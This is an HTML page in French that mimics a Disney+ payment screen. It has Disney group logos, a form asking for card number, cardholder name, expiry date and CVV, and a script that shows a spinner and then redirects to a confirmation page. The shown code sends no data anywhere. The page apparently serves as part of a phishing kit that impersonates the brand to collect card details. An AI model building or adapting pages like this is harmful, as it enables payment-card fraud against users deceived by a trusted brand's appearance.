<body>

  <img src="Images/compose2.png" alt="Disney+" class="logo" />

  <main>
    <h1>Informations de paiement</h1>

    <form id="paymentForm">
      <input type="text" placeholder="Numéro de carte" required />
      <input type="text" placeholder="Nom sur la carte" required />
      <input type="text" placeholder="MM/AA" required />
      <input type="text" placeholder="Cryptogramme (CVV)" required />
      <button type="submit">Valider le paiement</button>
    </form>

    <!-- Logos partenaires -->
    <div class="footer-note" style="margin-top: 30px; font-size: 0.75rem; color: #444; text-align: left; line-height: 1.4;">
      <strong>Disney+ fait partie des entreprises du groupe Walt Disney</strong><br />
      MyDisney vous permet d'accéder facilement aux différents services du groupe, comme Disney+, ESPN, Walt Disney World <a href="#">et bien +</a>.

      <div class="logos-container" style="display: flex; flex-wrap: wrap; justify-content: center; align-items: center; gap: 14px; margin-top: 14px;">
        <img src="Images/compose2.png" alt="Disney+" style="height: 22px; opacity: 0.7; filter: grayscale(100%);" />
        <img src="Images/abc-logo-image-4413.png" alt="ABC" style="height: 22px; opacity: 0.7; filter: grayscale(100%);" />
        <img src="Images/espn-png-logo-4149.png" alt="ESPN" style="height: 22px; opacity: 0.7; filter: grayscale(100%);" />
        <img src="Images/marvel-logo-34291.png" alt="Marvel" style="height: 22px; opacity: 0.7; filter: grayscale(100%);" />
        <img src="Images/star-wars-logo-1002.png" alt="Star Wars" style="height: 22px; opacity: 0.7; filter: grayscale(100%);" />
        <img src="Images/Hulu-Logo-PNG.png" alt="Hulu" style="height: 22px; opacity: 0.7; filter: grayscale(100%);" />
        <img src="Images/natgeo-logo.png" alt="National Geographic" style="height: 22px; opacity: 0.7; filter: grayscale(100%);" />
      </div>
    </div>
  </main>

  <!-- Spinner -->
  <div id="spinnerOverlay">
    <div class="spinner"></div>
  </div>

  <script>
    document.getElementById("paymentForm").addEventListener("submit", function(e) {
      e.preventDefault();
      document.getElementById("spinnerOverlay").style.display = "flex";

      setTimeout(() => {
        window.location.href = "confirmation.html";
      }, 2500);
    });
  </script>

</body>
